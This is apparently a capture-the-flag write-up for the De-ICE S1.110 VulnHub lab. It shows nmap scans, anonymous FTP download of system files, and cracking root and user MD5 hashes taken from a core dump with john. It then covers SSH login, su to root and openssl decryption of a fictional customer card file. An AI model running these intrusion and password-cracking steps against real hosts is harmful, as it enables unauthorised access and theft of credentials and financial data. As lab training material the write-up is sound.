# __De-ICE_S1.110__
[Link to vulnhub](https://www.vulnhub.com/entry/de-ice-s1110,9/)

## Reconnaissance
```
nmap -sS -O 192.168.1.0/24

Nmap scan report for 192.168.1.110
Host is up (0.00033s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
631/tcp open  ipp
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Network Distance: 1 hop
```

## __Enumeration__
Nmap vulnerability scan
```
Nmap scan report for 192.168.1.110
Host is up (0.00039s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.4
|_sslv2-drown: 
22/tcp  open  tcpwrapped
80/tcp  open  http       Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.2.4 (Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       http://seclists.org/fulldisclosure/2011/Aug/175
|       http://nessus.org/plugins/index.php?view=single&id=55976
|       http://osvdb.org/74721
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
631/tcp open  ipp        CUPS 1.1
|_http-server-header: CUPS/1.1
MAC Address: 00:0C:29:A2:AA:41 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.13 - 2.6.32
Uptime guess: 0.004 days (since Sat Dec 30 14:05:29 2017)
Network Distance: 1 hop
```

It's 4 services (FTP, SSH, HTTP, HTTP). 
#### __FTP__
	* FTP anonymous enable
```
root@BOEING:# ftp 192.168.1.110
Connected to 192.168.1.110.
220 (vsFTPd 2.0.4)
Name (192.168.1.110:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls -lR  /kapi/tmp/ftp_192.168.1.110.txt 
output to local-file: /kapi/tmp/ftp_192.168.1.110.txt? y
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

Download all file in /download directory
```
root@BOEING:# wget -r --user="anonymous" --password="anonymous" ftp://192.168.1.110/download

root@BOEING:# grep -rn -iE --color "root" "download"
...snip...
Binary file download/etc/core matches
...snip...
```

After checking ASCII files  I got hash of root user in /download/etc/shadow which has been cracked to "toor" but I could not login with this credention. Then I took a look at /download/etc/core file which is a file containing a process's address space (memory) when the process terminates unexpectedly. 
```
root@BOEING:# strings download/etc/core 
...snip...
root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::

<< re-arrange >>
root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::
```

* Crack hashes
```
root@BOEING:# vi hash_core
root@BOEING:# john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt hash_core
```

I got no luck here but the hint told me that the passwords could be cracked. So I will use additional option --rules which increase possibility to crack password by tweeking word before compute their hashes.

The following specified in man page of john tool.
```
-rules Enables wordlist rules, that are read from [List.Rules:Wordlist] in /etc/john/john.conf (or the alternative configuration file you might
              specify on the command line).
              This option requires the -wordlist option to be passed as well.
```

Try john again.

```
root@BOEING:# john --rules --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt hash_core
root@BOEING:# john --show hash_core 
root:Complexity:13574:0:::::
bbanter:Zymurgy:13571:0:99999:7:::

root@BOEING:# ssh root@192.168.1.110
root@192.168.1.110's password: 
Permission denied, please try again.
root@192.168.1.110's password: 

root@BOEING:# ssh bbanter@192.168.1.110
bbanter@192.168.1.110's password: 
Linux 2.6.16.
bbanter@slax:~$ 
```

I could not login with root account but bbanter.

## __Exploit__
```
root@BOEING:# ssh bbanter@192.168.1.110
bbanter@192.168.1.110's password: 
Linux 2.6.16.
bbanter@slax:~$ 
```


## __Privilege escalation__
I got root password so just SU
```
bbanter@slax:~$ su
Password: ********** (Complexity)
```

Check for home/root
```
root@slax:/home/root/.save# ls -al
total 8
drwx------ 2 root   root 100 Mar 15  2007 .
drwxr-xr-x 3 aadams  513 100 Mar 15  2007 ..
-r-x------ 1 root   root 198 Mar 13  2007 copy.sh
-rw-r--r-- 1 aadams  513 560 Mar 13  2007 customer_account.csv.enc
root@slax:/home/root/.save# cat copy.sh 
#!/bin/sh
#encrypt files in ftp/incoming
openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
#remove old file
rm /home/ftp/incoming/$1
```

Now I could decrypt customer_account.csv.enc using parameters specified in copy.sh
```
openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
```

Let's decrypt the file
```
root@slax:/home/root/.save# openssl enc -d -aes-256-cbc -salt -in /home/root/.save/customer_account.csv.enc -out /tmp/customer_account.csv -pass file:/etc/ssl/certs/pw
root@slax:/home/root/.save# cat /tmp/customer_account.csv    
"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"
```